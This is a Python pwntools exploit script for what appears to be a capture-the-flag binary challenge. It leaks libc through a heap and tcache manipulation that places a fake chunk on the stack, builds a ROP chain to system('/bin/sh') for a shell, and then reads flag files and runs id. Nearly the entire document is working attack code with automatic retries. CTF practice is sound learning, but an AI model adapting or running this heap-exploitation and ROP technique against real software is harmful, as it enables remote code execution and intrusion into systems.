from pwn import *
import sys
context.log_level='error'; context.arch='amd64'
REMOTE = 'remote' in sys.argv
LIBC = './libc.so.6' if REMOTE else '/usr/lib/libc.so.6'
libc = ELF(LIBC, checksec=False)

STDOUT_BSS = 0x4040a0          # copy-reloc: holds &_IO_2_1_stdout_ in libc
POP_RDI_RBP = 0x4012e2         # planted gadget: pop rdi ; pop rbp ; ret

# name: first==8 bytes, then fake chunk size 0xa0 at buf+8, space at buf[15]
# split() NULs the space -> size qword = 0x00000000000000a0, mem = rbp-0x20 (16-aligned)
name = b'A'*8 + p64(0xa0)[:7] + b' ' + b'C'*14
assert len(name) == 30 and name[15:16] == b' '

def go():
    t = remote('chal.secso.cc', 4004) if REMOTE else process('./chal')
    t.sendafter(b'>> ', name)
    def menu(c): t.sendlineafter(b'>> ', str(c).encode())

    menu(1); menu(0); t.sendlineafter(b'>> ', b'dummy')   # init tcache, wishes[0]=heap
    menu(2); menu(-2)                                     # free(rbp-0x20) -> tcache[0xa0]
    menu(1); menu(1)                                      # malloc -> rbp-0x20 ; wishes[1]=stack
    # stage 1: point main's `first` at the stdout copy-reloc so printf %s leaks libc
    t.sendlineafter(b'>> ', b'B'*0x18 + p64(STDOUT_BSS))

    menu(2)                                               # delete prompt prints %s -> leak
    t.recvuntil(b'Mr. ')
    leak = u64(t.recvuntil(b'\x1b[0m', drop=True).ljust(8, b'\x00'))
    if leak >> 40 != 0x7f: t.close(); return None
    libc.address = leak - libc.sym['_IO_2_1_stdout_']
    log.warning('stdout %#x -> libc base %#x', leak, libc.address)
    if libc.address & 0xfff: t.close(); return None

    menu(1)                                               # free(rbp-0x20) again
    menu(1); menu(2)                                      # malloc -> rbp-0x20 again
    binsh = next(libc.search(b'/bin/sh\x00')); system = libc.sym['system']
    chain = flat({0x18: p64(STDOUT_BSS), 0x20: p64(0), 0x28: p64(POP_RDI_RBP),
                  0x30: p64(binsh), 0x38: p64(0), 0x40: p64(system)}, filler=b'C')
    if b'\n' in chain: t.close(); return None             # fgets would truncate
    t.sendlineafter(b'>> ', chain)
    menu(3)                                               # main returns -> ROP
    t.recvuntil(b'vape', timeout=5); sleep(1); t.clean(1)
    t.sendline(b'echo PWNED; cat /flag /flag.txt 2>/dev/null; id')
    r = t.recvrepeat(4)
    t.close()
    return r

for attempt in range(12):
    try:
        r = go()
    except (EOFError, PwnlibException) as e:
        r = None
    if r and b'PWNED' in r:
        print(r.decode(errors='replace')[-400:]); break
    log.warning('attempt %d failed, retrying', attempt)
else:
    print('exhausted attempts')
